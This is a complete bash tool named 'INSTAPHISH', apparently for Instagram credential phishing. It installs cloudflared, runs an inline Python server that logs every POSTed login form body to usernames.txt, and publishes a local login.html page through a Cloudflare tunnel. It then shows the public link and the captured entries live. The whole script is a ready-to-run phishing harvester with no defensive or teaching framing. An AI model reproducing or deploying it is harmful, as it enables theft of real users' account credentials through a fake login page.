#!/bin/bash

# Clear terminal screen
clear

# Function to check and install dependencies
install_deps() {
    if ! command -v figlet >/dev/null 2>&1; then
        echo "[+] Installing figlet..."
        sudo apt update && sudo apt install -y figlet
    fi

    if ! command -v cloudflared >/dev/null 2>&1; then
        echo "[+] Installing cloudflared..."
        # Downloads the linux-amd64 version. Change if using ARM/Termux.
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
        chmod +x cloudflared-linux-amd64
        sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
    fi
}

install_deps

# Big banner
figlet "INSTAPHISH"

echo "------------------------------------------"
echo "1. Start Server & Generate Public URL"
echo "2. View Captured Data (usernames.txt)"
echo "3. Exit"
echo "------------------------------------------"
read -p "Choose an option: " choice

if [ "$choice" -eq 1 ]; then
    # Cleanup: Kill any old processes
    echo "[+] Cleaning up old processes..."
    pkill -f "http.server" > /dev/null 2>&1
    pkill -f "cloudflared" > /dev/null 2>&1
    sleep 1

    # Check if the HTML template exists
    if [ ! -f "login.html" ]; then
        echo "[-] Error: login.html not found! Please create it first."
        exit 1
    fi

    echo "[+] Starting Memory-Based Python Server on port 8080..."
    
    # Running Python logic directly without a .py file
    python3 -c '
import http.server, socketserver
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8")
        with open("usernames.txt", "a") as f:
            f.write(f"{post_data}\n---\n")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", 8080), MyHandler) as httpd:
    httpd.serve_forever()
' > /dev/null 2>&1 &

    echo "[+] Initializing Cloudflare Tunnel..."
    rm -f tunnel.log
    cloudflared tunnel --url http://localhost:8080 > tunnel.log 2>&1 &

    echo "[+] Waiting for Public URL generation..."
    
    timeout=0
    PUBLIC_URL=""
    while [ $timeout -lt 15 ]; do
        PUBLIC_URL=$(grep -o 'https://[-a-zA-Z0-9.]*\.trycloudflare.com' tunnel.log | head -n 1)
        if [ -n "$PUBLIC_URL" ]; then
            break
        fi
        echo -n "."
        sleep 2
        ((timeout++))
    done

    if [ -z "$PUBLIC_URL" ]; then
        echo -e "\n[-] FAILED to generate URL. Check tunnel.log for errors."
        exit 1
    fi

    echo -e "\n\n============================================"
    echo -e "  SUCCESS! YOUR PAGE IS ONLINE"
    echo -e "  URL: \033[1;32m$PUBLIC_URL/login.html\033[0m"
    echo -e "============================================"
    echo "[+] Logs will be saved to: usernames.txt"
    echo "[+] Press Ctrl+C to stop the server"

    # Show logs in real-time
    touch usernames.txt
    tail -f usernames.txt

elif [ "$choice" -eq 2 ]; then
    if [ -f "usernames.txt" ]; then
        echo "--- START OF CAPTURED DATA ---"
        cat usernames.txt
        echo "--- END OF DATA ---"
    else
        echo "[-] No data captured yet."
    fi

elif [ "$choice" -eq 3 ]; then
    echo "[+] Shutting down..."
    pkill -f "http.server"
    pkill -f "cloudflared"
    exit
else
    echo "Invalid option"
fi
